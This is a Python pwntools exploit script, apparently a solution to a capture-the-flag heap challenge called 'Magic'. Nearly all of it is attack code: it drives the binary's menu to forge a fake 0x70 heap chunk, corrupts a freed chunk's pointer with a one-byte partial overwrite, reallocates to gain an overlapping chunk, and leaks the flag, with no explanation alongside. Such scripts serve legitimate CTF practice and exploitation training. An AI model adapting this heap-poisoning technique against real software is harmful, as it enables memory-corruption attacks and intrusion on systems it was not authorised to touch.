#!/usr/bin/python3

from pwn import *

p = process('./data/bin/heap23_43_lyzy_2021_Magic')
elf = ELF('./data/bin/heap23_43_lyzy_2021_Magic')
libc = elf.libc

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def add(idx):
    p.sendlineafter("Input your choice: \n", "1\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.recvuntil("Search finished\n")


def edit(idx, data):
    p.sendlineafter("Input your choice: \n", "2\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.sendafter("Input the Magic\n", data)
    p.recvuntil("Magic> ")
    m = p.recvuntil(" <Magic")
    info(f"Get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter("Input your choice: \n", "3\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.recvuntil("remove the Magic\n")


# alloc
add(0)
add(0)
add(0)
add(0)
add(1)

# prepare for a fake 0x70 chunk
edit(1, flat([0, 0, 0, 0x71]))
dele(1)
dele(0)

# partial overwrite 
edit(0, "\xe0")
add(0)
add(0)

# leak flag
edit(0, "a"*0x50)

p.interactive()